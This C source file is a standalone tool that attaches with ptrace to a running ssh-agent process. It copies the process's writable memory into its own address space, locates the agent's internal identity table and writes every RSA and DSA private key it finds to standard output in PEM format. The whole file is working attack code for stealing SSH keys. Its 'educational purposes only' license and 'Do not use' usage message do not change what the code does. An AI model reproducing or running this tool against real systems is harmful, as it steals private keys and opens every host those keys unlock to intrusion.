/*
 * Copyright (C) 2007-2009 Stealth.
 * All rights reserved.
 *
 * This is NOT a common BSD license, so read on.
 *
 * Redistribution in source and use in binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. The provided software is FOR EDUCATIONAL PURPOSES ONLY! You must not
 *    use this software or parts of it to commit crime or any illegal
 *    activities. Local law may forbid usage or redistribution of this
 *    software in your country.
 * 2. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 3. Redistribution in binary form is not allowed.
 * 4. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Stealth.
 * 5. The name Stealth may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <openssl/dsa.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>


#define TAILQ_HEAD(name, type)                                          \
struct name {                                                           \
        struct type *tqh_first; /* first element */                     \
        struct type **tqh_last; /* addr of last next element */         \
}

#define TAILQ_FIRST(head)               ((head)->tqh_first)
#define TAILQ_END(head)                 NULL
#define TAILQ_NEXT(elm, field)          ((elm)->field.tqe_next)
#define TAILQ_LAST(head, headname)                                      \
        (*(((struct headname *)((head)->tqh_last))->tqh_last))
#define TAILQ_PREV(elm, headname, field)                                \
        (*(((struct headname *)((elm)->field.tqe_prev))->tqh_last))
#define TAILQ_EMPTY(head)                                               \
        (TAILQ_FIRST(head) == TAILQ_END(head))

#define TAILQ_FOREACH(var, head, field)                                 \
        for((var) = TAILQ_FIRST(head);                                  \
            (var) != TAILQ_END(head);                                   \
            (var) = TAILQ_NEXT(var, field))

#define TAILQ_ENTRY(type)                                               \
struct {                                                                \
        struct type *tqe_next;  /* next element */                      \
        struct type **tqe_prev; /* address of previous next element */  \
}


struct Key {
        int      type;
        int      flags;
        RSA     *rsa;
        DSA     *dsa;
};

typedef struct identity {
        TAILQ_ENTRY(identity) next;
        struct Key *key;
        char *comment;
        u_int death;
        u_int confirm;
} Identity;

typedef struct {
        int nentries;
        TAILQ_HEAD(idqueue, identity) idlist;
} Idtab;

Idtab idtable[3];

int max_fd = 0;

pid_t parent_pid = -1;
unsigned int parent_alive_interval = 0;


void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


int mirror_maps(pid_t pid, char **ret_addr, size_t *ret_size)
{
	char proc[32], buf[128], *start = NULL, *end = NULL;
	unsigned long addr1 = 0, addr2 = 0, l = 0;
	int status = 0, last_was_lib = 0;
	FILE *f;

	snprintf(proc, sizeof(proc), "/proc/%d/maps", pid);

	if ((f = fopen(proc, "r")) < 0)
		die("fopen");

	if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0)
		die("ptrace");

	wait4(-1, &status, 0, NULL);

	for (;;) {
		if (!fgets(buf, sizeof(buf), f))
			break;
		if (strstr(buf, "lib")) {
			last_was_lib = 1;
			continue;
		}
		if (!strstr(buf, "rw-p"))
			continue;
		if (strstr(buf, "[stack]"))
			continue;
		if (strstr(buf, "[vdso]"))
			continue;

		if (last_was_lib && !strchr(buf, '/')) {
			continue;
		}

		last_was_lib = 0;

		start = strtok(buf, "-");
		addr1 = strtoul(start, NULL, 16);
		end = strtok(NULL, " ");
		addr2 = strtoul(end, NULL, 16);

		printf("Found addr 0x%s\n", buf);

		if (ret_addr && !*ret_addr)
			*ret_addr = (char *)addr1;
		if (ret_size && !*ret_size)
			*ret_size = addr2 - addr1;
		addr1 = (unsigned long)mmap((void *)addr1, addr2 - addr1,
		                           PROT_READ|PROT_WRITE,
		                           MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,
		                           -1, 0);
		if (addr1 == -1)
			die("mmap");


		for (;addr1 < addr2; addr1 += sizeof(long)) {
			l = ptrace(PTRACE_PEEKTEXT, pid, (void *)addr1, 0, 0);
			*(unsigned long *)addr1 = l;
		}
	}

	ptrace(PTRACE_DETACH, pid, 0, 0);
	fclose(f);
	return 0;
}


void dump_keys(char *ptr, size_t len)
{
	int i = 0, status = 0;
	Identity *id;

	for (i = 0; i < len; ++i) {
		if (memcmp(ptr, "/tmp/ssh-", 9) == 0 && strpbrk(ptr, "agent"))
			break;
		++ptr;
	}

	if (i == len) {
		printf("No socketname found.\n");
		return;
	}

	printf("Found socket name %s (%p)\n", ptr, ptr);
	fflush(stdout);

	for (i = 0; i < 200; ++i) {
		if (fork() == 0) {
			ptr -= i;
			memcpy(&idtable, ptr, sizeof(idtable)); 

			// version 2 keys
			Idtab *tab = &idtable[2];

        		TAILQ_FOREACH(id, &tab->idlist, next) {
				if (id->key->rsa)
					PEM_write_RSAPrivateKey(stdout, id->key->rsa, NULL, NULL, 0, NULL, NULL);
				else if (id->key->dsa)
					PEM_write_DSAPrivateKey(stdout, id->key->dsa, NULL, NULL, 0, NULL, NULL);
			}

			/* version 1 keys
			tab = &idtable[1];

        		TAILQ_FOREACH(id, &tab->idlist, next) {
				if (id->key->rsa)
					PEM_write_RSAPrivateKey(stdout, id->key->rsa, NULL, NULL, 0, NULL, NULL);
			}*/

			exit(1);
        	} else {
			wait4(-1, &status, 0, NULL);
		}
	}
	return;
}


void usage()
{
	printf("Usage: Do not use.\n");
	exit(1);
}


int main(int argc, char **argv)
{
	int c = 0;
	pid_t pid = 0;
	char *ptr = NULL;
	size_t len = 0;

	while ((c = getopt(argc, argv, "p:")) != -1) {
		switch (c) {
		case 'p':
			pid = atoi(optarg);
			break;
		default:
			usage();
		}
	}


	if (!pid)
		usage();

	mirror_maps(pid, &ptr, &len);
	dump_keys(ptr, len);

	exit(0);
}

